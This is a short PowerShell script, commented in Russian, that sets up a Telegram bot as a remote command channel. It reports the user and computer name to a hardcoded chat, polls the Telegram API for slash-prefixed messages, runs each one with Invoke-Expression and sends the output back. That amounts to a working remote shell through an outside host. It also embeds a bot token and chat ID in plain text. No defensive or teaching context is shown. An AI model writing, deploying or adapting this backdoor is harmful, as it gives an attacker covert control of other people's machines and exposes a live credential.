# Telegram bot через native PowerShell (без Python)
$Token = "7812032063:AAHcpDZge7GoAFkgzVXMncdlyXn3eAX2A18"
$ChatID = "249127714"
$API = "https://api.telegram.org/bot$Token"

function Send-TGMessage {
    param($Text)
    $Body = @{
        chat_id = $ChatID
        text = $Text
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "$API/sendMessage" -Method Post -ContentType "application/json" -Body $Body -ErrorAction Stop
    } catch {
        Start-Sleep -Seconds 2
    }
}

Send-TGMessage "🖥️ Сессия запущена: $env:USERNAME@$env:COMPUTERNAME"

while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$API/getUpdates?timeout=10" -ErrorAction Stop
        if ($Updates.ok) {
            foreach ($Update in $Updates.result) {
                $Msg = $Update.message
                if ($Msg.text -eq "/exit") {
                    Send-TGMessage "🔴 Сессия завершена"
                    exit
                }
                elseif ($Msg.text -match "^/") {
                    $Cmd = $Msg.text.Substring(1)
                    $Output = Invoke-Expression $Cmd 2>&1 | Out-String
                    Send-TGMessage "💻 Результат:`n$Output"
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 5
    }
}
